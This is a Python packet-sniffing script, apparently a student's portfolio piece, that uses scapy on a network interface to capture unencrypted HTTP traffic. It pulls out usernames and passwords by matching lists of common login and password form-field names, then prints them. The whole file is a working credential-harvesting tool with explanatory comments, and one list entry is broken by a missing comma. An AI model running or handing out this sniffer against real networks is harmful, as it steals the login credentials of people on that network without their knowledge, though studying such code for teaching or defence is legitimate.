#Alexandros Darras password sniffer programming portfolio. student id: 100567110

#This will only work in http websites. and not https

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~oo~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#                                 o o
#                                 o ooo
#                                   o oo
#                                      o o      |   #)
#                                       oo     _|_|_#_
#                                         o   | ()  ()|
#    __                    ___________________|       |_________________
#   |   -_______-----------       password Sniffer                       \
#  >|    _____                                                   --->     )
#   |__ -     ---------_________________________________________________ /


from scapy.all import *
from urllib import parse
import re

iface='eth0'

def get_login_pass(body):# here we will take the packets that are captured from our packet_parser() function and extract the username and password.

    user=None
    password=None
            #the two lists are going to help us find usernames and passwords inside the 'body' which is the payload of the tcp layer of the packet.
            #we are going to check every element of the lists if it exists in the body and if it does we are going to print the username and the password.

    userfields = ['log', 'login', 'wpname', 'ahd_username', 'unickname', 'nickname', 'user', 'user_name',
                  'alias', 'pseudo', 'email', 'username', '_username', 'userid', 'form_loginname', 'loginname',
                  'login_id', 'loginid', 'session_key', 'sessionkey', 'pop_login', 'uid', 'id', 'user_id', 'screename',
                  'uname', 'ulogin', 'acctname', 'account', 'member', 'mailaddress', 'membername', 'login_username',
                  'login_email', 'loginusername', 'loginemail', 'uin', 'sign-in', 'usuario']

    passfields = ['ahd_password', 'pass', 'password', '_password', 'passwd', 'session_password', 'sessionpassword',
                  'login_password', 'loginpassword', 'form_pw', 'pw', 'userpassword', 'pwd', 'upassword',
                  'login_password'
                  'passwort', 'passwrd', 'wppassword', 'upasswd', 'senha', 'contrasena']

    for login in userfields:
        login_re= re.search('(%s=[^&]+)' % login, body, re.IGNORECASE) # here we are calling the re(regex library(regular expressions library,it provides a class that
                                                                    #represents resular expressions,whicha re a kind of minilanguage used to perform
                                                                    #pattern matching within strings.) and we are using the search() function, it takes three parameters
                                                                    #the first is pattern that we have to specify to get the username (%s is the item of the list=a string),
                                                                    # the second is where we are
                                                                    #going to look for the username ,
                                                                    # and the third is that we dont care for upper or lower case.
        if login_re:
            user = login_re.group()

    for passfield in passfields:
        pass_re=re.search('(%s=[^&]+)' % passfield, body, re.IGNORECASE)
        if pass_re:
            password= pass_re.group()
    if user and password:
        return(user,password)

def pkt_parser(packet):#here we filter the packets that might contain a username and password.
    if packet.haslayer(TCP) and packet.haslayer(Raw) and packet.haslayer(IP): #we check every packet if it has a tcp layer
                                                                                #if it has layer raw ,and layer ip
        body = str(packet[TCP].payload) #if all of these conditions are met then we assign the variable body to the payload of the tcp layer.
        user_pass =get_login_pass(body) #we send this body to our second function get_login_pass()

        if user_pass != None:
            print(packet[TCP].payload) # this is to print also the name ofthe website from which we take the passwords and usernames.
            print(parse.unquote(user_pass[0]))
            print(parse.unquote(user_pass[1]))
    else:
        pass

try:
    sniff(iface=iface,prn=pkt_parser,store=0)
except KeyboardInterrupt:
    print('exiting program')
    exit(0)
